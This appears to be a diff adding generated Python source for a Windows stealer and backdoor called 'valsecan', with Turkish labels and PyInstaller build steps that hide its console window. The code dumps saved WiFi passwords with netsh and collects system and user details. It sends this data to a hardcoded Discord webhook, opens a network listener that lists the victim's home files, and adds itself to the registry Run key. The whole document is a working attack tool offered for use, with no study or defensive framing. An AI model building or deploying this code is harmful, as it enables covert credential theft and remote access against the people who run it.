@@ -1,0 +1,133 @@
+========================================
+VALSECAN - WINDOWS KAYNAK KODU (Python)
+Olusturulma: 27.05.2026 00:31:07
+Secilen ozellikler: Dosya Kurtarma, Tarayıcı Şifreleri, Ekran Görüntüsü, WiFi Şifreleri, Email Yedekleme, Belgeler, Sistem Bilgileri, Otomatik Başlat
+NOT: Bu kodu .exe yapmak icin: pip install pyinstaller
+     sonra: pyinstaller --onefile --noconsole servis.py
+========================================
+
+== servis.py ==
+
+import socket, threading, os, json, requests, platform
+from datetime import datetime
+import subprocess
+import sqlite3, shutil
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1508945513754394785/3ojXKY3FMuVVg-bKPtzJNGn4FoYGjqRxqUs0n2-_iXvfTQ5wARsWPpzwI42Gama94J65"
+BOT_NAME = "valse can"
+APP_NAME = "valsecan"
+PORT = 8766
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Bilinmiyor"
+
+def get_system_info():
+    return {
+        "os": platform.system() + " " + platform.release(),
+        "hostname": socket.gethostname(),
+        "ip": get_local_ip(),
+        "user": os.getenv("USERNAME") or os.getenv("USER")
+    }
+
+
+def get_wifi_passwords():
+    passwords = []
+    try:
+        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+        profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]
+        for profile in profiles:
+            r = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
+            for line in r.stdout.split("\n"):
+                if "Key Content" in line:
+                    passwords.append({"ssid": profile, "password": line.split(":")[1].strip()})
+    except: pass
+    return passwords
+
+
+def send_discord():
+    try:
+        info = get_system_info()
+        fields = [
+            {"name": "💻 İşletim Sistemi", "value": info["os"], "inline": True},
+            {"name": "🖥️ Bilgisayar Adı", "value": info["hostname"], "inline": True},
+            {"name": "👤 Kullanıcı", "value": info["user"] or "?", "inline": True},
+            {"name": "🔗 IP Adresi", "value": info["ip"] + ":" + str(PORT), "inline": False},
+            {"name": "⏰ Bağlandı", "value": datetime.now().strftime("%d.%m.%Y %H:%M"), "inline": True},
+        ]
+        
+        wifi = get_wifi_passwords()
+        if wifi:
+            wifi_str = "\n".join([f"{w['ssid']}: {w['password']}" for w in wifi[:10]])
+            fields.append({"name": "📶 WiFi Şifreleri", "value": wifi_str[:1000] or "Bulunamadı", "inline": False})
+        
+        payload = {
+            "username": BOT_NAME,
+            "embeds": [{
+                "title": "🖥️ YENİ BİLGİSAYAR BAĞLANDI",
+                "color": 43775,
+                "fields": fields
+            }]
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
+    except Exception as e:
+        print(f"Discord hatasi: {e}")
+
+def handle_client(conn):
+    try:
+        data = conn.recv(1024).decode()
+        
+        if data == "FILES":
+            files = []
+            for root, dirs, filenames in os.walk(os.path.expanduser("~")):
+                dirs[:] = [d for d in dirs if d not in ['.git','node_modules','AppData']]
+                for f in filenames[:50]:
+                    files.append(os.path.join(root, f))
+                if len(files) >= 200: break
+            conn.send(json.dumps(files[:200]).encode())
+            conn.close()
+            return
+        
+        conn.send(b"{}") 
+        conn.close()
+    except: pass
+
+def start_server():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", PORT))
+    s.listen(5)
+    while True:
+        conn, _ = s.accept()
+        threading.Thread(target=handle_client, args=(conn,)).start()
+
+if __name__ == "__main__":
+    threading.Thread(target=send_discord, daemon=True).start()
+    
+    # Otomatik baslat
+    import winreg
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, os.path.abspath(__file__))
+        winreg.CloseKey(key)
+    except: pass
+    
+    start_server()
+
+== requirements.txt ==
+
+requests
+pyinstaller
+
+== BUILD_KOMUTLARI.txt ==
+
+1. Python yukle: python.org
+2. pip install requests pyinstaller
+3. pyinstaller --onefile --noconsole servis.py
+4. dist/ klasorunde .exe olusur
